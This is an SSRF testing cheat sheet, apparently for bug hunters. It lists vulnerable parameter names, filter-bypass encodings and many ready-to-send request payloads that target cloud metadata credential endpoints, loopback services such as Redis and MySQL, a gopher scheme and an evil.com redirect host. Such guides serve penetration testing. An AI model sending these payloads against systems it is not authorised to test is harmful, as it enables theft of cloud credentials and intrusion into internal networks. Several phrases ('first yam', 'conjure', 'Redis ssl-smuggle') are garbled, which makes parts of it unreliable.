# HOW TO TEST SSRF ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN
The app fetches something you control the URL of - server-side.

## The N ways to test
1. Param hunt: url=, src=, link=, uri=/fetch/i, img=, callback=, webhook= (see ssrf-param wordlist).
2. Outbound confirm: set value to YOUR-COLLABORATOR.burpcollaborator.net (HTTP/DNS hit).
3. Internal reachability: loopback 127.0.0.1:PORT -> detect open internal ports by response diff/timing.
4. Metadata: 169.254.169.254 / metadata.google.internal / 100.100.100.200.
5. Write services: Redis/Memcached/MySQL/FastCGI via gopher (see SSRF-Advanced-Exploitation.md).
6. Redirect-chained SSRF: open redirect on another param -> if app follows redirects now server-side SSRF.
7. Full-taint flows: PDF/image converters conjure; link preview imports.
8. Blind SSRF: only OOB callback exists - still High on cloud (AWS keys via metadata).

## Bypass ladder (they block 127.0.0.1 / deny metadata)
- 127.0.0.1: localhost, 0, 0x7f000001, 2130706433, 127.1, [::1], 127.0.0.1.nip.io, hex IPv6.
- Scheme/redir: http:// -> https:// mixes, //-relative, @-padding, open-redirect chain.
- DNS-rebind for strict allow (own domain toggles public/internal).
- For metadata: add trailing /path, use IPv6 variants  ::ffff:169.254.169.254.

## Step-by-step on target
1. 20-line param fuzz (your wordlist) on first GET; watch Collaborator.
2. On the first yam, set url=169.254.169.254/latest/meta-data/ and log credential block.
3. If web root unknown, loopback port scan via /127.0.0.1:8080, :3000, :9200, :6379 (response size).
4. If gopher supported, chain Redis ssl-smuggle via SSRF-Advanced file.
5. For PDF/convert endpoints: the file you control is the SSRF-vector (markdown image src, HTML link).

## Worked examples (concrete)
OOB confirm:
```
GET /preview?url=http://YOUR-COLLABORATOR.burpcollaborator.net
GET /fetch?target=//YOUR-COLLABORATOR.oast.fun/index.html
metadata:
GET /fetch?url=http://169.254.169.254/latest/meta-data/
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET /fetch?url=http://169.254.169.254/latest/user-data
loopback probe:
GET /fetch?url=http://127.0.0.1:8080/admin
GET /fetch?url=http://127.0.0.1:9200/_cat/indices
GET /fetch?url=http://127.0.0.1:6379/           # redis banner text
GET /fetch?url=http://127.0.0.1:3306/           # mysql banner
bypass patterns:
GET /fetch?url=http://0
GET /fetch?url=http://0x7f000001
GET /fetch?url=http://2130706433
GET /fetch?url=http://[::1]:8080/
GET /fetch?url=http://127.1
GET /fetch?url=//169.254.169.254/latest/meta-data/
GET /fetch?url=http://127.0.0.1@evil.com  → then open-redirect  → server follows to internal
gopher to Redis (after you confirm gopher support):
```
gopher://127.0.0.1:6379/_INFO
full chain in SSRF/SSRF-Advanced-Exploitation.md

## False positives
- Response echoes your URL but server NEVER connects (cache or validation) - only trust your OOB hit.
- A fetch to external-only gate (client-side) isn't SSRF - the app must dial.

## Tools
- ffuf + your wordlist, ssrfmap, gopher_flipper, Burp Collaborator, interactsh; sqlmap on gopher if present.
